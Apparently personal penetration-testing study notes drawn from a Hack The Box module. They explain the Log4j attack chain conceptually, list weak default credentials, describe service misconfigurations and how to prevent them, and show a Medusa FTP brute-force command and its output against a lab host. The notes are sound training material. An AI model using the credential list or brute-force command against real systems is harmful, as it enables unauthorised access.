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gQIECAAAECBAgQIECAAIFKBQRJKi0Y2SJAgAABAgQIECBAgAABAgT6FRAk6ddbagQIECBAgAABAgQIECBAgEClAoIklRaMbBEgQIAAAQIECBAgQIAAAQL9CgiS9OstNQIECBAgQIAAAQIECBAgQKBSAUGSSgtGtggQIECAAAECBAgQIECAAIF+BQRJ+vWWGgECBAgQIECAAAECBAgQIFCpgCBJpQUjWwQIECBAgAABAgQIECBAgEC/AoIk/XpLjQABAgQIECBAgAABAgQIEKhUQJCk0oKRLQIECBAgQIAAAQIECBAgQKBfAUGSfr2lRoAAAQIECBAgQIAAAQIECFQqIEhSacHIFgECBAgQIECAAAECBAgQINCvgCBJv95SI0CAAAECBAgQIECAAAECBCoVECSptGBkiwABAgQIECBAgAABAgQIEOhXQJCkX2+pESBAgAABAgQIECBAgAABApUKCJJUWjCyRYAAAQIECBAgQIAAAQIECPQrIEjSr7fUCBAgQIAAAQIECBAgQIAAgUoFBEkqLRjZIkCAAAECBAgQIECAAAECBPoVECTp11tqBAgQIECAAAECBAgQIECAQKUCgiSVFoxsESBAgAABAgQIECBAgAABAv0KCJL06y01AgQIECBAgAABAgQIECBAoFIBQZJKC0a2CBAgQIAAAQIECBAgQIAAgX4FBEn69ZYaAQIECBAgQIAAAQIECBAgUKmAIEmlBSNbBAgQIECAAAECBAgQIECAQL8CgiT9ekuNAAECBAgQIECAAAECBAgQqFRAkKTSgpEtAgQIECBAgAABAgQIECBAoF8BQZJ+vaVGgAABAgQIECBAgAABAgQIVCogSFJpwcgWAQIECBAgQIAAAQIECBAg0K+AIEm/3lIjQIAAAQIECBAgQIAAAQIEKhUQJKm0YGSLAAECBAgQIECAAAECBAgQ6FdAkKRfb6kRIECAAAECBAgQIECAAAEClQoIklRaMLJFgAABAgQIECBAgAABAgQI9CsgSNKvt9QIECBAgAABAgQIECBAgACBSgUESSotGNkiQIAAAQIECBAgQIAAAQIE+hUQJOnXW2oECBAgQIAAAQIECBAgQIBApQKCJJUWjGwRIECAAAECBAgQIECAAAEC/QoIkvTrLTUCBAgQIECAAAECBAgQIECgUgFBkkoLRrYIECBAgAABAgQIECBAgACBfgUESfr1lhoBAgQIECBAgAABAgQIECBQqYAgSaUFI1sECBAgQIAAAQIECBAgQIBAvwKCJP16S40AAQIECBAgQIAAAQIECBCoVECQpNKCkS0CBAgQIECAAAECBAgQIECgXwFBkn69pUaAAAECBAgQIECAAAECBAhUKiBIUmnByBYBAgQIECBAgAABAgQIECDQr4AgSb/eUiNAgAABAgQIECBAgAABAgQqFRAkqbRgZIsAAQIECBAgQIAAAQIECBDoV0CQpF9vqREgQIAAAQIECBAgQIAAAQKVCgiSVFowskWAAAECBAgQIECAAAECBAj0KyBI0q+31AgQIECAAAECBAgQIECAAIFKBQRJKi0Y2SJAgAABAgQIECBAgAABAgT6FRAk6ddbagQIECBAgAABAgQIECBAgEClAoIklRaMbBEgQIAAAQIECBAgQIAAAQL9CgiS9OstNQIECBAgQIAAAQIECBAgQKBSAUGSSgtGtggQIECAAAECBAgQIECAAIF+BQRJ+vWWGgECBAgQIECAAAECBAgQIFCpgCBJpQUjWwQIECBAgAABAgQIECBAgEC/AoIk/XpLjQABAgQIECBAgAABAgQIEKhUQJCk0oKRLQIECBAgQIAAAQIECBAgQKBfAUGSfr2lRoAAAQIECBAgQIAAAQIECFQq8P8s1vXh3ro1OQAAAABJRU5ErkJggg==)

We conceptualize that each vulnerability can have four categories.
- Source: Provides information to the Process.
- Process: What is actually running.
- Privileges: The group of privileges the process is executed under.
- Destination: The specific goal to be acheived.

## Source

Is generalized to the source of information used for the specific task of a process.

<table class="table table-striped text-left">
<thead>
<tr>
<th><strong>Information Source</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Code</code></td>
<td>This means that the already executed program code results are used as a source of information. These can come from different functions of a program.</td>
</tr>
<tr>
<td><code>Libraries</code></td>
<td>A library is a collection of program resources, including configuration data, documentation, help data, message templates, prebuilt code and subroutines, classes, values, or type specifications.</td>
</tr>
<tr>
<td><code>Config</code></td>
<td>Configurations are usually static or prescribed values that determine how the process processes information.</td>
</tr>
<tr>
<td><code>APIs</code></td>
<td>The application programming interface (API) is mainly used as the interface of programs for retrieving or providing information.</td>
</tr>
<tr>
<td><code>User Input</code></td>
<td>If a program has a function that allows the user to enter specific values used to process the information accordingly, this is the manual entry of information by a person.</td>
</tr>
</tbody>
</table>

### Log4j Example

Log4j is a framework or library used to log application messages in Java and other programming languages. The library contained classes and functions that other programming languages could integrate.

## Processes

The process processes the information forwarded from the source. Most vulnerabilities lie in the program code executed by the process.

<table class="table table-striped text-left">
<thead>
<tr>
<th><strong>Process Components</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>PID</code></td>
<td>The Process-ID (PID) identifies the process being started or is already running. Running processes have already assigned privileges, and new ones are started accordingly.</td>
</tr>
<tr>
<td><code>Input</code></td>
<td>This refers to the input of information that could be assigned by a user or as a result of a programmed function.</td>
</tr>
<tr>
<td><code>Data processing</code></td>
<td>The hard-coded functions of a program dictate how the information received is processed.</td>
</tr>
<tr>
<td><code>Variables</code></td>
<td>The variables are used as placeholders for information that different functions can further process during the task.</td>
</tr>
<tr>
<td><code>Logging</code></td>
<td>During logging, certain events are documented and, in most cases, stored in a register or a file. This means that certain information remains in the system.</td>
</tr>
</tbody>
</table>

### Log4j

In the Log4j case, the process was intended to log the User-Agent as a string and store it properly. But the vulnerability allowed the misinterpretation of the string which lead to execution.

## Privileges

Are present in any system that controls processes. They determine what tasks and actions can be performed on a system.

<table class="table table-striped text-left">
<thead>
<tr>
<th><strong>Privileges</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>System</code></td>
<td>These privileges are the highest privileges that can be obtained, which allow any system modification. In Windows, this type of privilege is called <code>SYSTEM</code>, and in Linux, it is called <code>root</code>.</td>
</tr>
<tr>
<td><code>User</code></td>
<td>User privileges are permissions that have been assigned to a specific user. For security reasons, separate users are often set up for particular services during the installation of Linux distributions.</td>
</tr>
<tr>
<td><code>Groups</code></td>
<td>Groups are a categorization of at least one user who has certain permissions to perform specific actions.</td>
</tr>
<tr>
<td><code>Policies</code></td>
<td>Policies determine the execution of application-specific commands, which can also apply to individual or grouped users and their actions.</td>
</tr>
<tr>
<td><code>Rules</code></td>
<td>Rules are the permissions to perform actions handled from within the applications themselves.</td>
</tr>
</tbody>
</table>

### Log4j

In this case, the privileges were set to system since the logging process had to be able to write to logs which are generally considered sensitive.

## Destination

Each task has a purpose or goal. The results of the task are stored or forwarded to some other place for more processing This is the `destination` of the task. It may be someplace local or on the network.

### Log4j

![](https://academy.hackthebox.com/storage/modules/116/log4jattack.png)

<table class="table table-striped text-left">
<thead>
<tr>
<th><strong>Step</strong></th>
<th><strong>Log4j</strong></th>
<th><strong>Concept of Attacks - Category</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>1.</code></td>
<td>The attacker manipulates the user agent with a JNDI lookup command.</td>
<td><code>Source</code></td>
</tr>
<tr>
<td><code>2.</code></td>
<td>The process misinterprets the assigned user agent, leading to the execution of the command.</td>
<td><code>Process</code></td>
</tr>
<tr>
<td><code>3.</code></td>
<td>The JNDI lookup command is executed with administrator privileges due to logging permissions.</td>
<td><code>Privileges</code></td>
</tr>
<tr>
<td><code>4.</code></td>
<td>This JNDI lookup command points to the server created and prepared by the attacker, which contains a malicious Java class containing commands designed by the attacker.</td>
<td><code>Destination</code></td>
</tr>
</tbody>
</table>

The cycle then continues:

<table class="table table-striped text-left">
<thead>
<tr>
<th><strong>Step</strong></th>
<th><strong>Log4j</strong></th>
<th><strong>Concept of Attacks - Category</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>5.</code></td>
<td>After the malicious Java class is retrieved from the attacker's server, it is used as a source for further actions in the following process.</td>
<td><code>Source</code></td>
</tr>
<tr>
<td><code>6.</code></td>
<td>Next, the malicious code of the Java class is read in, which in many cases has led to remote access to the system.</td>
<td><code>Process</code></td>
</tr>
<tr>
<td><code>7.</code></td>
<td>The malicious code is executed with administrator privileges due to logging permissions.</td>
<td><code>Privileges</code></td>
</tr>
<tr>
<td><code>8.</code></td>
<td>The code leads back over the network to the attacker with the functions that allow the attacker to control the system remotely.</td>
<td><code>Destination</code></td>
</tr>
</tbody>
</table>

# Service Misconfigurations

This occurs when the security framework is not correctly configured leading to an open pathway for unauthorized users.

## Authentication

Sometimes default creds are available and left in place. Other times administrators set up weak passwords.  We can always try weak combinations like:

```shell-session
admin:admin
admin:password
admin:<blank>
root:12345678
administrator:Password
```

## Anonymous Authentication

Is another weak configuration.

## Misconfigured Access Rights

This just means the account has permissions it shouldn't have. An FTP user who needs to upload may, for example, be given total access to the server.

Administrators need to plan their access rights strategy, and there are some alternatives such as [Role-based access control (RBAC)](https://en.wikipedia.org/wiki/Role-based_access_control), [Access control lists (ACL)](https://en.wikipedia.org/wiki/Access-control_list). If we want more details pros and cons of each method, we can read [Choosing the best access control strategy](https://authress.io/knowledge-base/role-based-access-control-rbac) by Warren Parad from Authress.

## Unnecessary Defaults

[Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) are part of the [OWASP Top 10 list](https://owasp.org/Top10/). Let's take a look at those related to default values:

-   Unnecessary features are enabled or installed (e.g., unnecessary ports, services, pages, accounts, or privileges).
-   Default accounts and their passwords are still enabled and unchanged.
-   Error handling reveals stack traces or other overly informative error messages to users.
-   For upgraded systems, the latest security features are disabled or not configured securely.

## Preventing Misconfiguration

Once we have setup our environment we should lock it down:
-   Admin interfaces should be disabled.
-   Debugging is turned off.
-   Disable the use of default usernames and passwords.
-   Set up the server to prevent unauthorized access, directory listing, and other issues.
-   Run scans and audits regularly to help discover future misconfigurations or missing fixes.

# Attacking [[Cybersecurity/Penetration Tester/FTP\|FTP]]

FTP is a standard network protocol for transferring files between computers.

## Enumeration

Nmap's standard default scripts `-sC` includes the ftp-anon Nmap script which will check for anonymous logins.

## Brute Forcing

We can try brute forcing with something like [Medusa](https://github.com/jmk-foofus/medusa). With `Medusa`, we can use the option `-u` to specify a single user to target, or you can use the option `-U` to provide a file with a list of usernames. The option `-P` is for a file containing a list of passwords. We can use the option `-M` and the protocol we are targeting (FTP) and the option `-h` for the target hostname or IP address.

```shell-session
$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
                                                             
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>                                                      
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456 (1 of 14344392 complete)
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 12345 (2 of 14344392 complete)
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456789 (3 of 14344392 complete)
ACCOUNT FOUND: [ftp] Host: 10.129.203.7 User: fiona Password: family [SUCCESS]
```

We may have better luck with password spraying.

## FTP Bounce Attack

We can bounce requests off the FTP server to reach hosts that are only on an internal network.
![Pasted image 20230401114556.png](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABDUAAAIZCAYAAAC2zgSWAAAABHNCSVQICAgIfAhkiAAAIABJREFUeF7sved3HMeW7ZnwIADCEobeU5Tta173dM97a82aP3s+zfSsad/36sqTovcEYQjvzezfiYxColgAAVKiAHEnVEKhKjPixI6IZO4d55xo2tZR+DACRsAIGAEjYASMgBEwAkbACBgBI2AEjMAxQ6D5mNlrc42AETACRsAIGAEjYASMgBEwAkbACBgBIxAIWNTwQDACRsAIGAEjYASMgBEwAkbACBgBI2AEjiUCFjWOZbfZaCNgBIyAETACRsAIGAEjYASMgBEwAkbAoobHgBEwAkbACBgBI2AEjIARMAJGwAgYASNwLBGwqHEsu81GGwEjYASMgBEwAkbACBgBI2AEjIARMAIWNTwGjIARMAJGwAgYASNgBIyAETACRsAIGIFjiYBFjWPZbTbaCBgBI2AEjIARMAJGwAgYASNgBIyAEbCo4TFgBIyAETACRsAIGAEjYASMgBEwAkbACBxLBCxqHMtus9FGwAgYASNgBIyAETACRsAIGAEjYASMgEUNjwEjYASMgBEwAkbACBgBI2AEjIARMAJG4FgiYFHjWHabjTYCRsAIGAEjYASMgBEwAkbACBgBI2AELGp4DBgBI2AEjIARMAJGwAgYASNgBIyAETACxxIBixrHsttstBEwAkbACBgBI2AEjIARMAJGwAgYASNgUcNjwAgYASNgBIyAETACRsAIGAEjYASMgBE4lghY1DiW3WajjYARMAJGwAgYASNgBIyAETACRsAIGAGLGh4DRsAIGAEjYASMgBEwAkbACBgBI2AEjMCxRMCixrHsNhttBIyAETACRsAIGAEjYASMgBEwAkbACFjU8BgwAkbACBgBI2AEjIARMAJGwAgYASNgBI4lAhY1jmW32WgjYASMgBEwAkbACBgBI2AEjIARMAJGwKKGx4ARMAJGwAgYASNgBIyAETACRsAIGAEjcCwRsKhxLLvNRhsBI2AEjIARMAJGwAgYASNgBIyAETACFjU8BoyAETACRsAIGAEjYASMgBEwAkbACBiBY4mARY1j2W022ggYASNgBIyAETACRsAIGAEjYASMgBGwqOExYASMgBEwAkbACBgBI2AEjIARMAJGwAgcSwRaj6XVNtoIGAEjYASMwEeGwHaD9jY1+OxDfLRdvGlNU/FbWfMhWvzb1FGPshH+bfrBtRoBI2AEjMDRRsCeGke7f2ydETACRsAIGAEjYASMgBEwAkbACBgBI7AHAvbU2AMYf2wEjIARMAK/HwTCs6B+2fttzdOyuL0PEkjb2w3AO+JuAw1tfkufNzUd8Ua9xX5/bQSMgBEwAkbgY0TAosbH2OtusxEwAkbgI0GgSmwbhUzsB8NREjRoRwNZ4Q3zPxQp30sk+lD1v9Hwygfv0udHra9zc/br86OA9X794O+MgBEwAkbACHwoBCxqfCikXY8RMAJGwAgYgfdBQMLG1vaWxI1EdSHi/DQ3/waRpDJhc2tTr62iRfWHDfZseZ/ebXjttvClz/PR3NRcIGZY0GgIlz80AkbACBiBjxQBixoface72UbACBiB3zMCDUMPRMQhiBBxvuf9VhlWQdQBhBFy3sJvveL4jaIR6u3f2NwoVtZXi4WVpWJ+ZT7s6+o4UZzs6ClOtHcWLS0tYW6+7pcivbu8HoTV6vpasby2XCytrRTL6yvF+uZ60drSWnS0thWdbZ1Fd0dXvPLxS9lRK3CPN/V4ZSxSH6ufQxxIfZ6LiP7Ofa5+r3prfCi7q83JbeA3stWGsI3+Xl4o1rfWi/aWtuLkiZNFl/obzFuaU59/aKz36AJ/bASMgBEwAkbgN0PAosZvBr0rNgJGwAgYgV8DgYYEVxVBFNc21kXIl4vVjVW9XxNJXw8T2lpFzNvaixNtJ/TqLNpF0kV538u8RsS4kW17VVI9F0FjfPZVcXf8QfHd01shaFwaOl/cGLtSnBs8UxM1clmN6sGeRp/vVX/1c67b2NwsJhemi4cTj4sn08/j/aowbFa5fSd6izP9Y8WVkYth02GPeqze1c5dNqvH8SaJ/pYYQ59jb/IuaVJ/d4QQQ3936n1rTSQQThRUCl4HbUt9G/J179KWLdm9uLpc3Hv1sPjp+c/FzNJcMdjdX3x+9pPiwtBZiRs9b3ro1MWqvGt/79WOg+Lg84yAETACRsAIfGgELGp8aMRdnxEwAkbACHwwBFihh9iuiMyy4j0lIj698LqYW1kQ2V2St8Fq2AKp7Wo/UfR39Ran+0aLUyeHip7O7qJNK+L1x0FI6n7EcK98FNV68vWciwcBpPzV/LQEjdvF//X9/1MMdPcWf770VdGn36P9I0VnefF+tlVt2u+8KKriocK5mxI0FoXXPYkqf3n0bXHrxd3i1dxksbm9GaeP9J4qPjt9I8j29bHLZRFvEVHKOhrls2iIEec3SDJRjzX9jXixuLpUzCzOFhMLU9H3i6uL4WGyvrURAgb9jRhzqmewGO07VQyrz/GAaHTsi9cBwm72vZ4K68rYlBcRHjEPJx8X/3b3v4sXs+PFuYEzxcnOkxI3BiRqdRVtwmI3HDt/HaqvywbX49gIB39mBIyAETACRuAoItD4X++jaKltMgJGwAgYASOwDwKZOFZX2dcVtoGA8ez1y+KnZz8XDyYeFS9FEF8vzYagkfMV4MqPe//wyVPFHy9+odeXxeXh8yK/3VFjPeHbO23nDkXPgkQ2uUpA974+7bhCW6rnKHBC4oxCUORtML+yKE+SVoWjrBUbIvD1PH/3lUmfwKrd5VUIcKlgVL+vCg0IQ9Q1tTBT/PXRdxJWfirGETRUd7c8RqgBgQCi3dnesRO6o2/q21HtvkZiRvX71I5kJ+fm8xvZWRUNltdW1cev5OXwoLg9fq94NPk0xA08NtblqaNAlKimrbmtGOwZCO+SP1z4vPjfr/+9PF54LEpqQX3k0V591qgdVXuq7ai2721YcB3hPdhNGErYrzAUsqpg4+7+3C1wtFRVqbKiRvbnUUBbG7VjL3v9uREwAkbACBiBo4SARY2j1Bu2xQgYASNgBN4LgUzS+L0mIj69OFPcGb9ffPvkx+JneRlMzE0US3Lrh/O1ScRobWqRt8FWsSoivLC5GBEHC1rRh0y+dXX9vSx914szRd5NautLqyfk9d8f5m+w3JCgArF+NjMuceN1iDznh84Un4xdi7wepyQOnO4fLUYkCv2Sx2GINgIVIg/eDd8rROcneZMgYjEGyJmCd0Zrc2uhbBTRnnmJXQyEIXk+rKyuHNH+TmJFEiSSmNEI33ft73e9rpEN/swIGAEjYASMwG+FgEWN3wp512sEjIARMAK/CAJ5BToLGrGKLYI7p4SaD6eeyLvg++KvD7+Rd8ZMeBH0KcSEUIPBnv5YrSccAaFjfnk+km7yHTkrqokYs8CB1wLnk5uDnBwRfqGKId+RMFN5OfD4IHEnOTl2rY6T00ItJjcFgsva5prEk41d3iLkeWhvaQ8CTq6KuH4X88w+CzueC4CYPCKK8ERI+UK0oi8MKCfKbG0v2ppao7yNjQ2dk+wnAWn2XMBedjIhvwjnt0gAQLzI3gLTSwrbWZ6LtuOVMXpypLh5+mox3HNK4TD9RW/XSYVHJM8WbKJs2gdOvPAwwGr6IOoQTqmeljcEBfAhhITraX5PR3fkkECMiM9lAwc5MSiD79b1+ZQEjB+e344QmUcTT4r51YXwIiE8Bq+M7vauSASLPYgdbcqdMtY3XPQqjKeWHDZKZgzFm7ABDLhmXdiBFzaFd4/q7tCrXf1e8ySpy8Wxuakxo+vo79qYieubNWba0vXkcJHARrn1YhqfpbLTO2yKKvRCxEk4rYfnDAdi3Qm1mdApruBzxuyqPJNoSz6Pc2lDm/oZHNK4TdfUeyZZ/AhofRgBI2AEjMARRcCixhHtGJtlBIyAETACB0RgR82ICyB8ELdX81PFba3Wk2jx6esXQdwuDZ0rbo5dj2SWY8pFAZElrGNZuRZmJWrAAi+dOi+iPhjksP5YE7mdUejKhMqeVI4L8nIgdEBOe7UzxZhyM5CjoVskvKlFVBQXgfKArEbiSgkoJP0k18Occj1AdiGtXSLcY73DyucxKOHlZBDmnUPlqCzKS2WmcqtkExFjVqLDy9mJYnJuSiEjK1HOqEj7sMrFPmxYUK6JCX0/MT9ZzCzPhsDBATln55KBrr7IKTLQ3Rekd0XY0NYnCuMgTwWeLYCMsDC3tBDiR4fCTk5u90gw2BEoSG76WmEfk2rnpPAiLwjlQbixZUgiw0jvUIguWRDI7Z2VIEU7CBvhu5unr4dghHcFdoM/B0lSx/qUU6S1QyLWonJ93Cl+eHZbHhqPI49Gr3J8cO3NM9eKswNjSRxRnyMGkFsFzBC5zui7XflTNIaSULQduTjwTqFOEnYiDiBI0MepDerzyMexE8JRFSY4HwEFDKaEBXk9GLIn1O4+YTyqa0/JwwVBrUm25SMkjEqf74ylnQGPoPFC3jP0J2OR8YxYd0HjnHwhHJyD3c9nXqrNMzEuaDdtQBRKeUWG1Jb+yCNTv6tKFFIZx9k+/zYCRsAIGAEjcFQQsKhxVHrCdhgBI2AEjMB7IZAJPlt3kgPipcgeoSfPXz8XQd2K0IjPzt4o/v7SH0V0rxWnegeDuELwIOgpZ8FGrOZD8CF3mUhy3qJyGpAcE8J8b/yhQjFeBuGlbLw0+iUGXB6+UNwYuVycFdkm6WhVmIDcIpw8k8Dy0/M7xdPpF8VriQqs3sMZu9q6QlC5OnIpfkP4ub5+1bwRSNiHAHD/1aMo+/HUU4kl68WN0Sul4NJbrIvAQmg5567yTTzSOSE2lKIKIg4iwJm+MYk+V4tPJATg1UCbwfF75dJYkKhAexEowHdLniqIFJ+euSE/j6bYSQQvDISbZ9MvIxTkgV60eUUhPmAKcT7VMySMTidPD3lRIKZkUQERAxGBZKSPJp8U2/J0SB4ZbcrlMSH7H6p9z8I74p+u/rnoVfhLc2dzMav2E3byQO1D0MBD4/LwxeIfr/85kpgifiAc5APPnDV5LhCS0tmOdwxeCsmbJsYEW6qqf7EBzB5PP5N4MK3+Wo0+QZg5rR1frqqOG/JYGZK3SofEFbxG8rgCB5J8cv19hcLwHgGN77EFAevSKY0Z4U34To9wwI69jtJBIzyEEJheSBz75skPavPj2GIXEeu6+hzPFLxmmAevJAJRPwIfuUaoXxlaQgBBUBo9ORxjLglHyf56kWkve/y5ETACRsAIGIGjgMDe/3IeBetsgxEwAkbACBiBAyKQQz3whlhYWwhPDUgwYgRE+vooxO1GcXH4nHbp6A6vibyiDsGDnHeKbBKywYp5rIfr7wjZUMjIM21j+o1yc5As865Iflqxb40wEcIiOH5UMtIXZaJRhBM8JJJd2wqNeB2CA6Ew3zyRQCDCjADDijnHmraX/VmJLW9MXSn+fPHvlLzyi/Au2H0ke/Jn/BWJPEW0f5KXwn/d+zo8FdhuFY8Lcl4gNCBOIMA8fz1e/L+3/y3yTSBoYHeHwl04KANCPtr3PLA5Mzga7UYA+ebxD8W3EgzwakE8WtvUFrMiy9MK6Wlra1M4Sqe2dB2JUI6VtZbaLinY8kQCBN4hHIgBhFlgE+EgeA/88dKXIQxgL/VzzMqzgK1jvxNOS7q2W/2F8ETCVwSN1/J8wAMFr5scCoRglL6blZDTEp44eGh8de6zyJuBWABWeZxESI68d2RR9EHVu4LQGUSiO2r7v9/7SwgCCC2EkSAEEOqCuMO4ujv4IL5jN5ozA6NFe1N7lIXwc19t+Prxd5HT5bE8XdiFh+2CiR0BY0SeH57dCeEIHK4NXwpxjCOPP95lm9MX28WycoDgPfP1k++Lf7nzH+rXlyFifKYtXwmdQvChfHb7+dvD74p/v//XEGdIokq4Ce1FGEHgwFNjfnmx6NdvMMW+7abkDWJxIxD3YQSMgBEwAkccAYsaR7yDbJ4RMAJGwAgcDgHIHCSN/A+slEMwSWZ5bvCsVsNHYgUfLwZCGcjdEKvfhBvoB8KO1wXnsM0ruTHYzpSy2E0DbwU8ASDS51VeIoHt+n4+wgAQChAX2AWE0IJ+EXcIJB4OTySK/CBh4HttyzojUj4sAon3QJ9W/DdkzxN5bnD9w4lnEho6gzAPndT2nS3sMPLmAeHc2tqOXCCQ1788+Kb4UaE27OxCjouvzn8WO3vgDUCbZtSGx8oxcleeDuwAg8BwBk8DiT2tEj0IhWFHmFxvR0uHPt8s+rSN6KhW/kkM+mJ6